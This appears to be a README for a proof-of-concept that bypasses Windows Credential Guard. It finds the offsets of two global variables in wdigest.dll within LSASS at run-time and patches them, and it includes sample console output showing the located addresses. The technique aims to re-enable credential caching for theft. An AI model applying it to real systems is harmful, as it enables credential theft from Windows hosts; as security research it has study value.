# Credential Guard Bypass

This code is an addition to the original [Credential Guard bypass](https://teamhydra.blog/2020/08/25/bypassing-credential-guard/) [PoC](https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240) by [@N4k3dTurtl3](https://twitter.com/N4k3dTurtl3), which consists in patching two global variables in the `wdigest.dll` module loaded by LSASS.

In the original implementation and other public implementations I found, the offsets to these variables were hardcoded according to the version of the target `wdigest.dll` DLL. In this PoC, I propose a generic solution to find these offsets at run-time.

This solution is discussed in detail [here](https://itm4n.github.io/credential-guard-bypass/). In short, it consists in searching for a particular code pattern which contains references to the two global variables. From there, it is just a matter of extracting the RIP-relative offsets and calculating their absolute values.

```console
C:\Temp>poc.exe
Matched code at 0x00001839: 39 1d 75 49 03 00 8b 05 c3 43 03 00
Offset of g_fParameter_UseLogonCredential: 0x000361b4
Offset of g_IsCredGuardEnabled: 0x00035c08
Base address of wdigest.dll: 0x00007FFEE32B0000
Address of g_fParameter_UseLogonCredential: 0x00007ffee32e61b4
Address of g_IsCredGuardEnabled: 0x00007ffee32e5c08
```